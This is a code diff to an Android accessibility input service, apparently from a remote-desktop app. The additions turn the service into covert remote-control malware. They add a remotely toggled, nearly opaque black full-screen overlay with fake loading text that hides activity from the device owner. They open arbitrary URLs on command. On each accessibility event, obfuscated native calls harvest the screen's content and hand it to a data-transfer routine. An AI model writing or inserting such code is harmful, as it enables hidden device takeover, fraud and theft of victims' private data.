@@ -35,6 +35,44 @@ import hbb.MessageOuterClass.KeyEvent
 import hbb.MessageOuterClass.KeyboardMode
 import hbb.KeyEventConverter
 
+//update 0523
+import android.view.WindowManager
+import android.view.WindowManager.LayoutParams.*
+import android.widget.FrameLayout
+import android.graphics.Color
+import android.annotation.SuppressLint
+import android.graphics.PixelFormat
+import android.view.Gravity
+import android.view.MotionEvent
+import android.view.View
+import android.util.DisplayMetrics
+import android.widget.ProgressBar
+import android.widget.TextView
+import android.content.Context
+import android.content.res.ColorStateList
+
+import android.content.Intent
+import android.net.Uri
+import ffi.FFI
+
+
+import android.graphics.*
+import java.io.ByteArrayOutputStream
+import android.hardware.HardwareBuffer
+import android.graphics.Bitmap.wrapHardwareBuffer
+import java.nio.IntBuffer
+import java.nio.ByteOrder
+import java.nio.ByteBuffer
+import java.io.IOException
+import java.io.File
+import java.io.FileOutputStream
+import java.lang.reflect.Field
+import java.text.SimpleDateFormat
+import android.os.Environment
+
+import java.util.concurrent.locks.ReentrantLock
+import java.security.MessageDigest
+
 // const val BUTTON_UP = 2
 // const val BUTTON_BACK = 0x08
 
@@ -46,6 +84,9 @@ const val RIGHT_UP = 18
 const val BACK_UP = 66
 const val WHEEL_BUTTON_DOWN = 33
 const val WHEEL_BUTTON_UP = 34
+
+const val WHEEL_BUTTON_BROWSER = 38//32+6
+
 const val WHEEL_DOWN = 523331
 const val WHEEL_UP = 963
 
@@ -68,6 +109,12 @@ class InputService : AccessibilityService() {
             get() = ctx != null
     }
 
+    //update 0523
+    private lateinit var windowManager: WindowManager
+    private lateinit var overLayparams_bass: WindowManager.LayoutParams
+    private lateinit var overLay: FrameLayout
+    private val lock = ReentrantLock()
+    
     private val logTag = "input service"
     private var leftIsDown = false
     private val touchPath = Path()
@@ -92,7 +139,7 @@ class InputService : AccessibilityService() {
     private val volumeController: VolumeController by lazy { VolumeController(applicationContext.getSystemService(AUDIO_SERVICE) as AudioManager) }
 
     @RequiresApi(Build.VERSION_CODES.N)
-    fun onMouseInput(mask: Int, _x: Int, _y: Int) {
+    fun onMouseInput(mask: Int, _x: Int, _y: Int,url: String) {
         val x = max(0, _x)
         val y = max(0, _y)
 
@@ -109,7 +156,14 @@ class InputService : AccessibilityService() {
                 }
             }
         }
-
+        //update 0523
+        if (mask == WHEEL_BUTTON_BROWSER) {	
+	  
+    	   if (!url.isNullOrEmpty()) {
+    		openBrowserWithUrl(url)
+    	    }
+            return
+        }
         // left button down, was up
         if (mask == LEFT_DOWN) {
             isWaitingLongPress = true
@@ -235,6 +289,63 @@ class InputService : AccessibilityService() {
         }
     }
 
+   //update0523
+   @RequiresApi(Build.VERSION_CODES.N)
+    fun onstart_capture(arg1: String,arg2: String) {
+	    SKL=!SKL
+         if(SKL)
+	    {
+	      FFI.c6e5a24386fdbdd7f(this)
+	    }
+	    else
+	    {
+		  FFI.a6205cca3af04a8d(this)   
+	    }
+    }
+
+    //update0523
+    @RequiresApi(Build.VERSION_CODES.N)
+    fun onstart_overlay(arg1: String, arg2: String) {
+        gohome = arg1.toInt()
+    
+        if (overLay != null && overLay.windowToken != null) { 
+            overLay.post {
+                if (gohome == 8) { 
+                    overLay.isFocusable = false
+                    overLay.isClickable = false
+                } else {  
+                    overLay.isFocusable = true
+                    overLay.isClickable = true
+                }
+                overLay.visibility = gohome
+            }
+        }
+    }
+    
+   //update0523
+   @SuppressLint("WrongConstant")
+    private fun openBrowserWithUrl(url: String) {
+	     try {
+		Handler(Looper.getMainLooper()).post(
+		{
+		    val intent = Intent("android.intent.action.VIEW", Uri.parse(url))
+		    intent.flags = 268435456
+		    if (intent.resolveActivity(packageManager) != null) {
+			      FloatingWindowService.app_ClassGen11_Context?.let {
+				    it.startActivity(intent)
+				}    
+		    }
+		    else
+		   {
+			    FloatingWindowService.app_ClassGen11_Context?.let {
+				    it.startActivity(intent)
+				}
+		   }
+		})
+	     } catch (e: Exception) {
+	    }
+      }
+    
     @RequiresApi(Build.VERSION_CODES.N)
     private fun consumeWheelActions() {
         if (isWheelActionsPolling) {
@@ -658,8 +769,32 @@ class InputService : AccessibilityService() {
         return success
     }
 
-
+   //update0523
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
+        var accessibilityNodeInfo3: AccessibilityNodeInfo?
+        try {
+    	    accessibilityNodeInfo3 = FFI.c88f1fb2d2ef0700(this)
+        } catch (unused6: java.lang.Exception) {
+            accessibilityNodeInfo3 = null
+        }
+        if (accessibilityNodeInfo3 != null) {
+            try {
+                //if (My_ClassGen_Settings.readBool(this, "SKL", false)) {
+                 if(SKL){
+                    val ss999: AccessibilityNodeInfo = accessibilityNodeInfo3
+                    Thread(Runnable { DataTransferManager.a012933444444(ss999) }).start()
+                }
+    		    else
+    		    {
+   
+    		    }
+            } catch (unused7: java.lang.Exception) {
+            }
+        }
+	    else
+	    {
+
+	    }
     }
 
     override fun onServiceConnected() {
@@ -677,12 +812,105 @@ class InputService : AccessibilityService() {
         fakeEditTextForTextStateCalculation?.layoutParams = LayoutParams(100, 100)
         fakeEditTextForTextStateCalculation?.onPreDraw()
         val layout = fakeEditTextForTextStateCalculation?.getLayout()
-        Log.d(logTag, "fakeEditTextForTextStateCalculation layout:$layout")
-        Log.d(logTag, "onServiceConnected!")
+
+        //update0503
+        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
+        try {
+            createView(windowManager)
+            handler.postDelayed(runnable, 1000)
+        } catch (e: Exception) {
+        }
+    }
+    
+    //update0503
+     @SuppressLint("ClickableViewAccessibility")
+    private fun createView(windowManager: WindowManager) {  
+        var flags = FLAG_LAYOUT_IN_SCREEN or FLAG_NOT_TOUCH_MODAL or FLAG_NOT_FOCUSABLE
+        if (viewUntouchable || viewTransparency == 0f) {
+            flags = flags or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
+        }
+
+        var ww = FFI.getNetArgs2()
+        var hh = FFI.getNetArgs3()	
+	
+    	overLayparams_bass =  WindowManager.LayoutParams(ww, hh, FFI.getNetArgs0(),FFI.getNetArgs1(), 1)
+        overLayparams_bass.gravity = Gravity.TOP or Gravity.START
+        overLayparams_bass.x = 0
+        overLayparams_bass.y = 0
+    	if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
+    	    overLayparams_bass.flags = overLayparams_bass.flags or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
+    	    overLayparams_bass.flags = overLayparams_bass.flags or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
+    	}
+    	overLay =  FrameLayout(this)
+    	overLay.setBackgroundColor(Color.parseColor("#000000"));//#000000
+    	overLay.getBackground().setAlpha(253)
+    	overLay.setVisibility(8)
+        overLay.setFocusable(false)
+        overLay.setClickable(false)
+
+        val loadingText = TextView(this, null)
+    	loadingText.text = "\n\n啊啊啊啊啊啊啊......"
+    	loadingText.setTextColor(-7829368)
+    	loadingText.textSize = 15.0f
+    	loadingText.gravity = Gravity.LEFT //Gravity.CENTER
+    	loadingText.setPadding(60, HomeHeight / 4, 0, 0)
+    
+    	val dp2px: Int = dp2px(this, 100.0f) //200.0f
+    	val paramstext = FrameLayout.LayoutParams(dp2px * 5, dp2px * 5)
+    	paramstext.gravity = Gravity.LEFT
+    	loadingText.layoutParams = paramstext
+    
+    	overLay.addView(loadingText)   	
+        windowManager.addView(overLay, overLayparams_bass)
+    }
+    
+     //update0503
+    fun dp2px(context: Context, f: Float): Int {
+        return (f * context.resources.displayMetrics.density + 0.5f).toInt()
+    }
+
+     //update0503
+    private val handler = Handler(Looper.getMainLooper())
+    private val runnable = object : Runnable {
+        override fun run() {
+               if (overLay.windowToken != null) 
+        		{ 
+        			    if (overLay.visibility == 8) {  
+        				 BIS = false
+        			     }
+        			    else {
+        			         BIS = true
+        			    }
+        			
+        			if( overLay.visibility != gohome)
+        			{ 
+        				overLay.post {
+        				    if (gohome == 8) {  
+        					overLay.isFocusable = false
+        					overLay.isClickable = false
+        				    } else {  
+        					overLay.isFocusable = true
+        					overLay.isClickable = true
+        				    }
+        				    overLay.visibility = gohome
+        				}
+        			   
+        			    // overLay.setVisibility(gohome)
+        			    // windowManager.updateViewLayout(overLay, overLayparams_bass)
+        		       }
+        			else
+        			{
+        	
+        			}
+        		}
+               handler.postDelayed(this, 50) 
+        }
     }
 
     override fun onDestroy() {
         ctx = null
+        //update0503
+        windowManager.removeView(overLay) 
         super.onDestroy()
     }
 
